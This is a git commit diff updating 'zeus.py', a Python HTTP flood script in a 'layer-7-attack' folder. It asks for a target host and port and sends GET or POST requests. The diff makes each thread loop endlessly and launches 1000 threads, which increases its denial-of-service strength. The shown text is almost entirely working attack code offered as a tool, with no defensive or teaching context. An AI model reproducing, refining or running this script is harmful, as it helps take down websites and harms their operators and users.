e73978569d2af67983fb0a6403228d0c4ae48cbf
AlaBouali <trap.leader.123@gmail.com>
2017-12-14 07:38:29 -0500

    update zeus script

--- layer-7-attack/zeus.py
+++ layer-7-attack/zeus.py
@@ -51,8 +51,8 @@ def en():
 def k():
  global i
  i+=1
- print'requests sent:', i
-    
+ print'\033[92mrequests sent:', i
+
 cr()
 en()
 print'\n[*]done!!!\n\n'
@@ -60,7 +60,7 @@ print'\n[*]done!!!\n\n'
 u=raw_input('TARGET:\n(www.example.com)\n>')
 p=input('port:\n>')
 b=input('options:\n 1-GET\n 2-POST\n>')
-c=input('spoof the host name?\n 1-yes (slower)\n 2-no (faster)\n>')
+c=input('use the host as proxy?\n 1-yes (slower)\n 2-no (faster)\n>')
 
 def so():
  try:
@@ -72,8 +72,8 @@ def so():
    conn.request("GET", '/')
    k()
  except socket.error as e:
-  pass
-  
+   print'\033[91m',e
+   
 def so2():
  try:
     params = random.choice(lis)
@@ -85,18 +85,20 @@ def so2():
      conn.request("POST", '/', params, headers)
      k()
  except socket.error as e:
-    pass
+    print'\033[91m',e
     
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
 		 if b==1:
-		  so()
+		  while True:
+		   so()
 		 elif b==2:
-			 so2()
+		  while True:
+		   so2()
 		except Exception, ex:
 			pass
-	
-while True:
+
+for x in range(1000):
    t = HTTPThread()
    t.start()
